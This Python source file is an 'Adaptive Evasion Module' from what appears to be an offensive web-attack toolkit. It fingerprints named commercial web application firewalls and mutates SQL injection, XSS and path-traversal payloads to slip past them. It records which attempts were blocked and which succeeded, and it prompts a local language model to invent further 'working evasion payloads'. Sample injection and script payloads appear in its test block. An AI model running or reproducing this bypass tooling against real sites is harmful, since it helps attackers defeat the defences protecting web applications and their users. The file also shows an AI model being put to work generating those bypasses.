"""
Adaptive Evasion Module
Learns from WAF/filter responses and adapts payloads to bypass detection
Uses AI to generate intelligent evasion techniques
"""

import re
import time
import hashlib
import random
import yaml
from typing import Dict, List, Optional, Any, Tuple
from collections import defaultdict
from datetime import datetime
from modules.ollama_integration import OllamaClient
import urllib.parse
import base64


class AdaptiveEvasion:
    """Intelligent WAF bypass using adaptive learning and AI"""

    def __init__(self, config_path: str = "config.yaml"):
        # Load configuration
        with open(config_path, "r") as f:
            self.config = yaml.safe_load(f)

        # Initialize Ollama for AI-powered evasion
        ollama_config = self.config["ollama"]
        self.client = OllamaClient(
            base_url=ollama_config["base_url"],
            model=ollama_config["models"]["exploit"],  # Use creative model
        )

        self.evasion_config = self.config["evasion"]

        # Learning database - tracks what works and what doesn't
        self.blocked_patterns = []  # Patterns that got blocked
        self.successful_patterns = []  # Patterns that bypassed
        self.waf_fingerprint = {}  # Detected WAF characteristics
        self.evasion_history = []  # History of evasion attempts

        # WAF detection signatures
        self.waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "akamai": ["akamai", "ak_bmsc"],
            "aws_waf": ["x-amzn-requestid", "x-amz-"],
            "imperva": ["incap_ses", "visid_incap"],
            "f5": ["bigip", "f5-"],
            "sucuri": ["x-sucuri-id", "sucuri"],
            "wordfence": ["wordfence", "wfvt_"],
            "modsecurity": ["mod_security", "modsec"],
        }

        # Blocked response indicators
        self.block_indicators = {
            "status_codes": [403, 406, 418, 429, 501],
            "keywords": [
                "blocked",
                "forbidden",
                "denied",
                "suspicious",
                "malicious",
                "attack",
                "hack",
                "injection",
                "firewall",
                "security",
                "waf",
                "protection",
                "unauthorized",
                "not acceptable",
                "rate limit",
            ],
            "patterns": [
                r"access\s+denied",
                r"request\s+blocked",
                r"security\s+violation",
                r"suspicious\s+activity",
            ],
        }

    def detect_waf(self, response, url: str) -> Dict[str, Any]:
        """Detect if a WAF is present and identify it"""
        print("[*] Detecting WAF presence...")

        detection_result = {
            "waf_detected": False,
            "waf_type": "unknown",
            "confidence": 0.0,
            "indicators": [],
            "recommended_evasion": [],
        }

        if not response:
            return detection_result

        # Check headers for WAF signatures
        headers = {k.lower(): v for k, v in response.headers.items()}

        for waf_name, signatures in self.waf_signatures.items():
            matches = 0
            for signature in signatures:
                if any(signature in str(v).lower() for v in headers.values()):
                    matches += 1
                    detection_result["indicators"].append(
                        f"Header signature: {signature}"
                    )

            if matches > 0:
                detection_result["waf_detected"] = True
                detection_result["waf_type"] = waf_name
                detection_result["confidence"] = min(matches / len(signatures), 1.0)
                break

        # Check response body for WAF indicators
        if response.text:
            body_lower = response.text.lower()
            for keyword in ["firewall", "waf", "security", "cloudflare", "akamai"]:
                if keyword in body_lower:
                    detection_result["waf_detected"] = True
                    detection_result["indicators"].append(f"Body keyword: {keyword}")

        # Check for common block pages
        if response.status_code in [403, 406]:
            detection_result["waf_detected"] = True
            detection_result["indicators"].append(
                f"Block status code: {response.status_code}"
            )

        # Store WAF fingerprint
        if detection_result["waf_detected"]:
            self.waf_fingerprint = {
                "type": detection_result["waf_type"],
                "url": url,
                "timestamp": datetime.now().isoformat(),
                "headers": dict(headers),
                "confidence": detection_result["confidence"],
            }

            # Recommend evasion techniques based on WAF type
            detection_result["recommended_evasion"] = self._get_waf_specific_evasion(
                detection_result["waf_type"]
            )

        return detection_result

    def is_blocked(self, response) -> bool:
        """Determine if request was blocked by WAF/filter"""
        if not response:
            return True

        # Check status code
        if response.status_code in self.block_indicators["status_codes"]:
            return True

        # Check response body for block keywords
        if response.text:
            body_lower = response.text.lower()

            # Keyword matching
            for keyword in self.block_indicators["keywords"]:
                if keyword in body_lower:
                    return True

            # Pattern matching
            for pattern in self.block_indicators["patterns"]:
                if re.search(pattern, body_lower, re.IGNORECASE):
                    return True

        # Check for suspiciously small response
        if len(response.text) < 100 and response.status_code in [200, 403]:
            return True

        return False

    def learn_from_block(self, payload: str, response, payload_type: str):
        """Learn from blocked request to improve future evasion"""
        print(f"[!] Request blocked - analyzing for patterns...")

        blocked_info = {
            "timestamp": datetime.now().isoformat(),
            "payload": payload,
            "payload_type": payload_type,
            "status_code": response.status_code if response else None,
            "response_snippet": response.text[:200] if response else None,
            "detected_patterns": [],
        }

        # Analyze what triggered the block
        if payload_type == "sql":
            blocked_info["detected_patterns"] = self._analyze_sql_block(payload)
        elif payload_type == "xss":
            blocked_info["detected_patterns"] = self._analyze_xss_block(payload)
        elif payload_type == "path_traversal":
            blocked_info["detected_patterns"] = self._analyze_path_traversal_block(
                payload
            )

        self.blocked_patterns.append(blocked_info)

        # Update evasion history
        self.evasion_history.append(
            {
                "type": "blocked",
                "payload": payload,
                "timestamp": datetime.now().isoformat(),
            }
        )

    def learn_from_success(self, payload: str, payload_type: str):
        """Learn from successful bypass"""
        print(f"[+] Bypass successful - storing pattern...")

        success_info = {
            "timestamp": datetime.now().isoformat(),
            "payload": payload,
            "payload_type": payload_type,
            "techniques_used": self._identify_techniques(payload),
        }

        self.successful_patterns.append(success_info)

        # Update evasion history
        self.evasion_history.append(
            {
                "type": "success",
                "payload": payload,
                "timestamp": datetime.now().isoformat(),
            }
        )

    def evade_payload(
        self,
        original_payload: str,
        payload_type: str,
        previous_attempts: List[str] = None,
    ) -> List[str]:
        """Generate evaded versions of payload using learned patterns"""
        print(f"[*] Generating evaded payloads for: {original_payload[:50]}...")

        evaded_payloads = []
        previous_attempts = previous_attempts or []

        # Method 1: Apply traditional evasion techniques
        traditional_evaded = self._apply_traditional_evasion(
            original_payload, payload_type
        )
        evaded_payloads.extend(traditional_evaded)

        # Method 2: Learn from successful patterns
        if self.successful_patterns:
            learned_evaded = self._apply_learned_patterns(
                original_payload, payload_type
            )
            evaded_payloads.extend(learned_evaded)

        # Method 3: AI-powered evasion generation
        if self.evasion_config.get("use_ai_generation", True):
            ai_evaded = self._ai_generate_evasion(
                original_payload, payload_type, previous_attempts
            )
            evaded_payloads.extend(ai_evaded)

        # Method 4: WAF-specific evasion
        if self.waf_fingerprint:
            waf_specific = self._apply_waf_specific_evasion(
                original_payload, self.waf_fingerprint.get("type", "unknown")
            )
            evaded_payloads.extend(waf_specific)

        # Remove duplicates and previously attempted payloads
        unique_payloads = []
        seen = set(previous_attempts)

        for payload in evaded_payloads:
            if payload not in seen:
                unique_payloads.append(payload)
                seen.add(payload)

        return unique_payloads[:10]  # Return top 10 variants

    def _apply_traditional_evasion(self, payload: str, payload_type: str) -> List[str]:
        """Apply traditional evasion techniques"""
        evaded = []

        techniques = self.evasion_config.get("techniques", [])

        for technique in techniques:
            if technique == "encoding":
                evaded.append(self._url_encode(payload))
                evaded.append(self._double_encode(payload))
                evaded.append(self._hex_encode(payload))

            elif technique == "case_variation":
                evaded.append(self._randomize_case(payload))
                evaded.append(self._alternate_case(payload))

            elif technique == "comment_injection":
                evaded.extend(self._inject_comments(payload, payload_type))

            elif technique == "whitespace_manipulation":
                evaded.append(self._replace_spaces_tabs(payload))
                evaded.append(self._add_newlines(payload))

            elif technique == "unicode_bypass":
                evaded.append(self._unicode_encode(payload))

            elif technique == "double_encoding":
                evaded.append(self._double_encode(payload))

        return evaded

    def _apply_learned_patterns(self, payload: str, payload_type: str) -> List[str]:
        """Apply techniques learned from successful bypasses"""
        evaded = []

        # Filter successful patterns by payload type
        relevant_successes = [
            p for p in self.successful_patterns if p["payload_type"] == payload_type
        ]

        if not relevant_successes:
            return evaded

        # Extract common techniques from successful payloads
        common_techniques = defaultdict(int)
        for success in relevant_successes:
            for technique in success["techniques_used"]:
                common_techniques[technique] += 1

        # Apply most successful techniques
        sorted_techniques = sorted(
            common_techniques.items(), key=lambda x: x[1], reverse=True
        )

        for technique, count in sorted_techniques[:3]:  # Top 3 techniques
            if technique == "comment_splitting":
                evaded.append(self._split_with_comments(payload, payload_type))
            elif technique == "mixed_encoding":
                evaded.append(self._mixed_encoding(payload))
            elif technique == "case_mixing":
                evaded.append(self._strategic_case_mix(payload))

        return evaded

    def _ai_generate_evasion(
        self, payload: str, payload_type: str, previous_attempts: List[str]
    ) -> List[str]:
        """Use AI to generate intelligent evasion variants"""
        print("[*] Using AI to generate evasion techniques...")

        # Build context from blocked patterns
        blocked_analysis = ""
        if self.blocked_patterns:
            recent_blocks = self.blocked_patterns[-5:]  # Last 5 blocks
            blocked_analysis = "\n".join(
                [
                    f"- Blocked: {b['payload'][:50]}... (Patterns: {', '.join(b['detected_patterns'])})"
                    for b in recent_blocks
                ]
            )

        # Build context from successful bypasses
        success_analysis = ""
        if self.successful_patterns:
            recent_success = self.successful_patterns[-3:]  # Last 3 successes
            success_analysis = "\n".join(
                [
                    f"- Success: {s['payload'][:50]}... (Techniques: {', '.join(s['techniques_used'])})"
                    for s in recent_success
                ]
            )

        prompt = f"""You are a penetration testing expert specializing in WAF bypass techniques.

TASK: Generate 5 creative evasion variants of this {payload_type} payload.

ORIGINAL PAYLOAD:
{payload}

CONTEXT:
WAF Type: {self.waf_fingerprint.get('type', 'Unknown')}
Previous Attempts (AVOID THESE):
{chr(10).join(['- ' + p[:50] for p in previous_attempts[-5:]]) if previous_attempts else 'None'}

RECENTLY BLOCKED PATTERNS:
{blocked_analysis if blocked_analysis else 'No data yet'}

RECENTLY SUCCESSFUL PATTERNS:
{success_analysis if success_analysis else 'No data yet'}

REQUIREMENTS:
1. Generate 5 completely different evasion variants
2. Each must maintain the original payload's functionality
3. Use advanced obfuscation techniques
4. Avoid patterns that were previously blocked
5. Apply lessons from successful bypasses

ADVANCED TECHNIQUES TO USE:
- Null byte injection: %00
- Unicode normalization: İ → i
- Character encoding mixup: hex, octal, unicode
- Case swapping in unexpected places
- Comment fragmentation: /**/
- Alternative syntax: CHAR() instead of strings in SQL
- HTML entity encoding: &lt;script&gt;
- JavaScript escapes: \\x3c for 
- Nested encoding layers

Generate 5 creative variants (one per line, no explanations):"""

        response = self.client.generate(
            prompt=prompt,
            temperature=0.9,  # High creativity
            system="You are an expert penetration tester. Generate creative, working evasion payloads.",
        )

        if not response:
            return []

        # Extract payloads from response
        variants = []
        for line in response.split("\n"):
            line = line.strip()
            # Remove numbering, bullets, etc.
            line = re.sub(r"^\d+[\.\)]\s*", "", line)
            line = re.sub(r"^[-*]\s*", "", line)

            if line and line != original_payload:
                variants.append(line)

        return variants[:5]

    def _apply_waf_specific_evasion(self, payload: str, waf_type: str) -> List[str]:
        """Apply WAF-specific evasion techniques"""
        evaded = []

        if waf_type == "cloudflare":
            # Cloudflare bypasses
            evaded.append(payload.replace(" ", "/**/"))
            evaded.append(payload.replace("SELECT", "SeLeCt"))
            evaded.append(self._unicode_encode(payload))

        elif waf_type == "modsecurity":
            # ModSecurity bypasses
            evaded.append(payload.replace("=", "%3D"))
            evaded.append(payload.replace(" ", "%09"))  # Tab character
            evaded.append(payload.replace("SELECT", "SELECT/**/"))

        elif waf_type == "wordfence":
            # Wordfence bypasses
            evaded.append(payload.replace("<script>", "<scr<script>ipt>"))
            evaded.append(self._double_encode(payload))

        elif waf_type == "akamai":
            # Akamai bypasses
            evaded.append(payload.replace("../", "..\\"))
            evaded.append(self._hex_encode(payload))

        return evaded

    def _get_waf_specific_evasion(self, waf_type: str) -> List[str]:
        """Get recommended evasion techniques for specific WAF"""
        recommendations = {
            "cloudflare": [
                "Use /**/ instead of spaces",
                "Mix upper/lowercase (SeLeCt)",
                "Unicode encoding",
                "Add null bytes (%00)",
            ],
            "modsecurity": [
                "URL encode special chars",
                "Use tab characters (%09)",
                "Comment injection (/**/)",
                "Newline injection (%0a)",
            ],
            "wordfence": [
                "Nested tags (<scr<script>ipt>)",
                "Double encoding",
                "HTML entity encoding",
                "Case variation",
            ],
            "akamai": [
                "Backslash instead of forward slash",
                "Hex encoding",
                "Mixed encoding",
                "Parameter pollution",
            ],
            "imperva": [
                "HTTP parameter pollution",
                "HPP (HTTP Parameter Pollution)",
                "Chunked encoding",
                "Mixed case",
            ],
        }

        return recommendations.get(
            waf_type,
            [
                "Try encoding variations",
                "Use comment injection",
                "Apply case variation",
                "Test Unicode bypasses",
            ],
        )

    # Encoding/Obfuscation Methods

    def _url_encode(self, payload: str) -> str:
        """URL encode the payload"""
        return urllib.parse.quote(payload)

    def _double_encode(self, payload: str) -> str:
        """Double URL encode"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return "".join([f"%{ord(c):02x}" for c in payload])

    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        encoded = ""
        for char in payload:
            if random.random() < 0.5:  # 50% of chars
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded

    def _randomize_case(self, payload: str) -> str:
        """Randomly vary case"""
        return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

    def _alternate_case(self, payload: str) -> str:
        """Alternate uppercase/lowercase"""
        return "".join(
            c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
        )

    def _inject_comments(self, payload: str, payload_type: str) -> List[str]:
        """Inject comments to break signatures"""
        variants = []

        if payload_type == "sql":
            # SQL comment injection
            variants.append(payload.replace(" ", "/**/"))
            variants.append(payload.replace("SELECT", "SEL/**/ECT"))
            variants.append(payload.replace("UNION", "UN/**/ION"))
            variants.append(payload.replace(" OR ", "/**/OR/**/"))

        elif payload_type == "xss":
            # HTML comment injection
            variants.append(payload.replace("<script>", "<scr<!---->ipt>"))
            variants.append(payload.replace("alert", "al<!---->ert"))

        return variants

    def _replace_spaces_tabs(self, payload: str) -> str:
        """Replace spaces with tabs"""
        return payload.replace(" ", "\t")

    def _add_newlines(self, payload: str) -> str:
        """Add newlines to break signatures"""
        return payload.replace(" ", "\n")

    def _mixed_encoding(self, payload: str) -> str:
        """Mix different encoding types"""
        result = ""
        for i, char in enumerate(payload):
            method = i % 4
            if method == 0:
                result += char
            elif method == 1:
                result += f"%{ord(char):02x}"
            elif method == 2:
                result += f"\\u{ord(char):04x}"
            else:
                result += char.upper() if char.islower() else char.lower()
        return result

    def _split_with_comments(self, payload: str, payload_type: str) -> str:
        """Split keywords with comments"""
        if payload_type == "sql":
            payload = payload.replace("SELECT", "SEL/**/ECT")
            payload = payload.replace("FROM", "FR/**/OM")
            payload = payload.replace("WHERE", "WH/**/ERE")
        return payload

    def _strategic_case_mix(self, payload: str) -> str:
        """Strategically mix case on keywords"""
        keywords = [
            "SELECT",
            "UNION",
            "FROM",
            "WHERE",
            "OR",
            "AND",
            "SCRIPT",
            "ALERT",
            "ONERROR",
            "IMG",
            "SVG",
        ]

        result = payload
        for keyword in keywords:
            if keyword in payload.upper():
                # Create mixed case version
                mixed = "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(keyword)
                )
                result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)

        return result

    # Analysis Methods

    def _analyze_sql_block(self, payload: str) -> List[str]:
        """Analyze what triggered SQL injection block"""
        patterns = []

        sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "--", "#"]
        for keyword in sql_keywords:
            if keyword in payload.upper():
                patterns.append(f"SQL keyword: {keyword}")

        if "'" in payload:
            patterns.append("Single quote detected")
        if '"' in payload:
            patterns.append("Double quote detected")
        if "--" in payload or "#" in payload:
            patterns.append("SQL comment detected")

        return patterns

    def _analyze_xss_block(self, payload: str) -> List[str]:
        """Analyze what triggered XSS block"""
        patterns = []

        if "<script" in payload.lower():
            patterns.append("Script tag detected")
        if "alert" in payload.lower():
            patterns.append("Alert function detected")
        if "onerror" in payload.lower() or "onload" in payload.lower():
            patterns.append("Event handler detected")
        if "javascript:" in payload.lower():
            patterns.append("JavaScript protocol detected")

        return patterns

    def _analyze_path_traversal_block(self, payload: str) -> List[str]:
        """Analyze what triggered path traversal block"""
        patterns = []

        if "../" in payload:
            patterns.append("Directory traversal sequence: ../")
        if ".." in payload:
            patterns.append("Double dot detected")
        if "/etc/passwd" in payload.lower():
            patterns.append("Sensitive file path: /etc/passwd")
        if "windows" in payload.lower():
            patterns.append("Windows system path detected")

        return patterns

    def _identify_techniques(self, payload: str) -> List[str]:
        """Identify evasion techniques used in payload"""
        techniques = []

        if "/**/" in payload:
            techniques.append("comment_splitting")
        if "%" in payload and any(c.isdigit() for c in payload):
            techniques.append("url_encoding")
        if "\\u" in payload:
            techniques.append("unicode_encoding")
        if any(c.isupper() and c.islower() for c in payload):
            techniques.append("case_mixing")
        if "\t" in payload or "\n" in payload:
            techniques.append("whitespace_manipulation")

        return techniques if techniques else ["standard"]

    def get_evasion_stats(self) -> Dict[str, Any]:
        """Get statistics on evasion attempts"""
        total_attempts = len(self.evasion_history)
        successes = len([e for e in self.evasion_history if e["type"] == "success"])
        blocks = len([e for e in self.evasion_history if e["type"] == "blocked"])

        return {
            "total_attempts": total_attempts,
            "successful_bypasses": successes,
            "blocked_attempts": blocks,
            "success_rate": (
                f"{(successes / total_attempts * 100):.1f}%"
                if total_attempts > 0
                else "0%"
            ),
            "waf_detected": bool(self.waf_fingerprint),
            "waf_type": (
                self.waf_fingerprint.get("type", "unknown")
                if self.waf_fingerprint
                else None
            ),
            "learned_patterns": {
                "successful": len(self.successful_patterns),
                "blocked": len(self.blocked_patterns),
            },
        }


# Testing
if __name__ == "__main__":
    print("[+] Testing Adaptive Evasion Module...")

    evasion = AdaptiveEvasion()

    # Test SQL injection evasion
    original_sql = "' OR '1'='1'--"
    print(f"\n[*] Original SQL payload: {original_sql}")

    evaded_sql = evasion.evade_payload(original_sql, "sql")
    print(f"[+] Generated {len(evaded_sql)} evaded variants:")
    for i, variant in enumerate(evaded_sql[:5], 1):
        print(f"    {i}. {variant}")

    # Test XSS evasion
    original_xss = "<script>alert(1)</script>"
    print(f"\n[*] Original XSS payload: {original_xss}")

    evaded_xss = evasion.evade_payload(original_xss, "xss")
    print(f"[+] Generated {len(evaded_xss)} evaded variants:")
    for i, variant in enumerate(evaded_xss[:5], 1):
        print(f"    {i}. {variant}")

    # Simulate learning
    print("\n[*] Simulating learning from blocks...")
    evasion.learn_from_block(original_sql, None, "sql")
    evasion.learn_from_success(evaded_sql[0], "sql")

    stats = evasion.get_evasion_stats()
    print(f"\n[+] Evasion Statistics:")
    print(f"    Total Attempts: {stats['total_attempts']}")
    print(f"    Success Rate: {stats['success_rate']}")
    print(f"    Learned Patterns: {stats['learned_patterns']}")

    print("\n[✓] Adaptive evasion test complete!")
